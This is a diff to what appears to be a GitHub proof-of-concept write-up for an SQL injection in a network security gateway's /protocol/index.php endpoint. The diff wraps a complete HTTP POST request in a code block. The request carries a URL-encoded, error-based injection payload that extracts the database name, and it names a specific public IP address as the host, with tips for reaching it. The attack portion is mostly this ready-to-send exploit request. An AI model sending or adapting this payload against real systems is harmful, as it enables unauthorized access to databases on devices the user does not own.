@@ -7,10 +7,12 @@ Vulnerability points：/protocol/firewall/uploadfirewall.php analyse as below: A
 
 ![image](https://github.com/gb111d/ns-asg_poc/assets/148308306/a9468bf8-1568-4afa-a94e-57d514310a50)
 
-Access through https://106.37.206.12/
+[https://106.37.206.12/]
+ps: use older tls version or just access through mobile browser.
 There is no validation during the execution of SQL injection.
 
 Poc：
+```
 POST /protocol/index.php HTTP/1.1
 Content-Length: 377
 Host: 106.37.206.12
@@ -28,7 +30,8 @@ Referer: https://106.37.206.12/protocol/index.php
 Connection: close
 
 jsoncontent=%7B%22protocolType%22%3A%22uploadfirewall%22%2C%22messagecontent%22%3A%5B%221%20AND%20%28SELECT%205347%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a716b71%2C%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C54%29%29%2C0x71707a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%22%5D%7D
+```
 
-Send request with the payload above
+Send request with the payload above.
 
 ![image](https://github.com/gb111d/ns-asg_poc/assets/148308306/b1c46f15-a899-4d81-9bf3-a3999ee2d28e)
